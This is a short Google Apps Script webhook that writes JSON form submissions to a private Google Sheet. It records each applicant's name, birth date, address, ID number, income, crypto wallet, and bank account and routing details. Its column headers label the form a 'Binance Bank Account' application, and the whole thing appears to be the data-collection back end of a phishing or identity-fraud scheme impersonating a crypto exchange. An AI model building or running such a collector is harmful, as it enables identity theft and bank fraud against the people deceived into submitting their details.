const SHEET_ID = "1I6sNi75m1xMFFQSmGisWM92_Lo_N8pHdivaeMya0_0k";
const SHEET_NAME = "Applications";

function doPost(e) {
  const spreadsheet = SpreadsheetApp.openById(SHEET_ID);
  const sheet = getOrCreateSheet_(spreadsheet, SHEET_NAME);
  const data = JSON.parse(e.postData.contents);

  ensureHeader_(sheet);

  sheet.appendRow([
    new Date(),
    data.reference || "",
    data.reviewTimeline || "3 banking days",
    data.firstName || "",
    data.lastName || "",
    data.birthDate || "",
    data.email || "",
    data.mobile || "",
    data.country || "",
    data.address || "",
    data.accountType || "",
    data.currency || "",
    data.income || "",
    data.idType || "",
    data.idNumber || "",
    data.fundSource || "",
    data.walletNetwork || "",
    data.walletAddress || "",
    data.bankCountry || "",
    data.bankName || "",
    data.bankAccountHolder || "",
    data.bankAccountNumber || "",
    data.bankRoutingCode || "",
    data.submittedAt || "",
  ]);

  return ContentService
    .createTextOutput(JSON.stringify({ ok: true }))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet() {
  return ContentService
    .createTextOutput("BBC Google Sheets webhook is live.")
    .setMimeType(ContentService.MimeType.TEXT);
}

function getOrCreateSheet_(spreadsheet, name) {
  return spreadsheet.getSheetByName(name) || spreadsheet.insertSheet(name);
}

function ensureHeader_(sheet) {
  if (sheet.getLastRow() > 0) return;

  sheet.appendRow([
    "Received At",
    "Reference",
    "Review Timeline",
    "First Name",
    "Last Name",
    "Birth Date",
    "Email",
    "Mobile",
    "Country or Region",
    "Residential Address",
    "Binance Bank Account Type",
    "Preferred Currency",
    "Monthly Income Range",
    "ID Type",
    "ID Number",
    "Source of Funds",
    "Wallet Network",
    "Wallet Address",
    "Bank Country or Region",
    "Personal Bank Name",
    "Bank Account Holder",
    "Bank Account Number or IBAN",
    "Bank SWIFT/BIC/Routing",
    "Submitted At",
  ]);
}
